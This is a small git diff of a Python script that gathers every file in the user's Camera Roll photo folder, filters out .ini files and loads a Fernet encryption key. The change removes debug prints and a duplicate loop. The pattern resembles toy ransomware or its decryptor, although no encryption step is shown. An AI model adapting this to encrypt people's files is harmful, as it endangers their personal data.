@@ -1,7 +1,7 @@
 import os
 import scandir
 from cryptography.fernet import Fernet
-folder = os.path.expandvars("%userprofile%")+"/Pictures/Camera Roll"
+folder = os.path.expandvars("%userprofile%")+"/Pictures/Camera Roll" #can be changed to fit your needs
 
 file_list = []
 i=0
@@ -15,20 +15,10 @@ for paths, dirs, files in scandir.walk(folder):
 while i <= len(file_list)-1:
     file_path =""
     file_path = file_list[i]
-    print(file_path)
-    print(i)
     if file_path.endswith("ini"):
         file_list.remove(file_list[i])
     i=i+1
 #end of ghostfilefilter
-while i <= len(file_list)-1:
-    file_path =""
-    file_path = file_list[i]
-    print(file_path)
-    print(i)
-    if file_path.endswith("ini"):
-        file_list.remove(file_list[i])
-    i=i+1
 
 with open("thekey.key", "rb") as thekey:
     secretkey = thekey.read()
